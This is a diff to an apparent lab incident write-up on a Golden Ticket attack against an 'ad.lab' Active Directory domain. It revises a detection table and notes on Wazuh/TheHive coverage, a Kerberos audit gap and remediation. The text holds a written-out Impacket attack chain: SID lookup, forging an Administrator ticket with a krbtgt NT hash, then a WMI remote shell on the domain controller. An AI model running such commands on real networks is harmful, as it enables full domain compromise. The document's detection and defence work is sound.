@@ -19,7 +19,7 @@ python3 /usr/local/bin/lookupsid.py ad.lab/HANK_SHERMAN:'Passw***123'@192.168.56
 python3 /usr/local/bin/ticketer.py -nthash 611a8***f60 -domain-sid S-1-5-21-3315718683-193253855-3518612541 -domain ad.lab Administrator
 
 # Load the forged ticket into the Kerberos credential cache and authenticate to the Domain Controller via WMI
-`export KRB5CCNAME=/tmp/Administrator.ccache`
+export KRB5CCNAME=/tmp/Administrator.ccache
 python3 /usr/local/bin/wmiexec.py -k -no-pass ad.lab/Administrator@PC-DC.ad.lab
 
 # Verify execution context and hostname within the remote shell
@@ -68,15 +68,14 @@ To validate the ticket, the attacker exported the environment variable `KRB5CCNA
 
 | Source | Rule / Event Description | Rule ID | TheHive Alert Title | Severity | Status |
 |---|---|---|---|---|---|
-| Domain Controller (`DomainWin10`) | Windows Security Event ID 4624 (LogonType 3 Kerberos) & Sysmon EID 1 (`wmiexec.py -k`) | Custom Rules 100615, 100603, 100613 | TheHive Alerts #27 & #28 (`16.png`, `16.5.png` / `wzb-ccff195e0c`, `wzb-c200f52606`) | High (3) | **Detected (Direct Target-Side & SOAR Delivery)** |
-| Wazuh (Host Command Audit) | Bash command by root: `python3 /usr/local/bin/ticketer.py -nthash ...` | Rule 100220 (Level 5) | SIEM Indexed (`Wazuh-Raw-Alerts.csv` Row 9306, `wzb-38`) | High | **Detected (Verbatim Command Capture)** |
-| Wazuh (Host Command Audit) | Bash command by root: `export KRB5CCNAME=/tmp/Administrator.ccache` | Rule 100220 (Level 5) | SIEM Indexed (`Wazuh-Raw-Alerts.csv` Row 9307) | Medium | **Detected (Kerberos Cache Activation)** |
-| Wazuh (Pivot Host) | sshd: authentication success (Pivot Session Alert) | Rule 5715 (Level 8) | TheHive Alert (`wzb-8d45b2d236`) | Medium | **Detected (Pivot Session Attribution)** |
-| Active Directory / Kerberos | Kerberos TGS request without matching AS-REQ / RC4 encryption | Event ID 4769 | Local DC Security Log (`Security.evtx`) | Medium | **Detected (Local DC Telemetry)** |
+| Domain Controller (`DomainWin10`) | Windows Security Event ID 4624 (LogonType 3 Kerberos) & Sysmon EID 1 (`wmiexec.py -k`) | Custom Rules 100615, 100603, 100613 | TheHive Alerts #27 & #28 (`16.png`, `16.5.png` / `wzb-ccff195e0c`, `wzb-c200f52606`) | High (3) | **Detected (Generic Logon & WMI Execution)** |
+| Linux Pivot Host (`DVWA`) | Bash command by root: `python3 /usr/local/bin/ticketer.py -nthash ...` | Rule 100220 (Level 5) | SIEM Indexed (`Wazuh-Raw-Alerts.csv` Row 9306, `wzb-38`) | High | **Detected (Pivot Command Capture)** |
+| Linux Pivot Host (`DVWA`) | Bash command by root: `export KRB5CCNAME=/tmp/Administrator.ccache` | Rule 100220 (Level 5) | SIEM Indexed (`Wazuh-Raw-Alerts.csv` Row 9307) | Medium | **Detected (Kerberos Cache Activation)** |
+| Active Directory / Kerberos | Kerberos Service Ticket Operations auditing (RC4 encryption / TGS without AS-REQ) | Event ID 4769 | Unconfigured in DC Baseline (`DG-16`) | Medium | **Target Logging Gap (DG-16 / Remediated)** |
 
 > [!NOTE]
-> **Telemetry Attribution & Pipeline Execution (Rule 100220):**  
-> While the Domain Controller cannot distinguish a forged Golden Ticket from a legitimate TGT (as the ticket is cryptographically valid under the stolen `krbtgt` key), Impacket `ticketer.py` was launched interactively on the DVWA pivot at `18:06:40 IST` (`Wazuh-Raw-Alerts.csv` Row 9306): `python3 /usr/local/bin/ticketer.py -nthash 611a8cdcc21cb3fe3bf3a4c2f4e05f60 -domain-sid S-1-5-21-3315718683-193253855-3518612541 -domain ad.lab Administrator`, followed immediately by Kerberos cache staging (`export KRB5CCNAME=/tmp/Administrator.ccache`, Row 9307). As a Level 5 rule, Rule 100220 recorded the command locally on DVWA and indexed into OpenSearch without SIEM-to-SOAR escalation. Meanwhile, the pivot SSH session used to run it triggered TheHive Alert 14 (`wzb-8d45b2d236` via elevated Rule 5715), and subsequent ticket presentation generated Event ID 4769 in local DC EVTX logs.
+> **Detection Partition Reality (Pivot-Only Coverage DG-16):**  
+> While the Domain Controller cannot inherently distinguish a forged Golden Ticket from a legitimate TGT without ticket request correlation (as the ticket is cryptographically valid under the stolen `krbtgt` key), Impacket `ticketer.py` was launched interactively on the DVWA pivot at `18:06:40 IST` (`Wazuh-Raw-Alerts.csv` Row 9306): `python3 /usr/local/bin/ticketer.py -nthash 611a8cdcc21cb3fe3bf3a4c2f4e05f60 -domain-sid S-1-5-21-3315718683-193253855-3518612541 -domain ad.lab Administrator`, followed immediately by Kerberos cache staging (`export KRB5CCNAME=/tmp/Administrator.ccache`, Row 9307). As a Level 5 rule, Rule 100220 recorded the command locally on DVWA and indexed into OpenSearch without SIEM-to-SOAR escalation. When `wmiexec.py -k` executed against `PC-DC`, Sysmon Event ID 1 triggered Custom Rule 100613 on `DomainWin10` (TheHive Alerts #27 & #28). However, the DC recorded standard Kerberos logons (EID 4624) rather than ticket forgery detection because Kerberos Service Ticket Operations (EID 4769) were unconfigured in the default baseline (`DG-16`). Remediated post-incident via EID 4769 auditing, Protected Users enrollment, and a double `krbtgt` password reset (reaching KVNO 3).
 
 ## MITRE ATT&CK
 
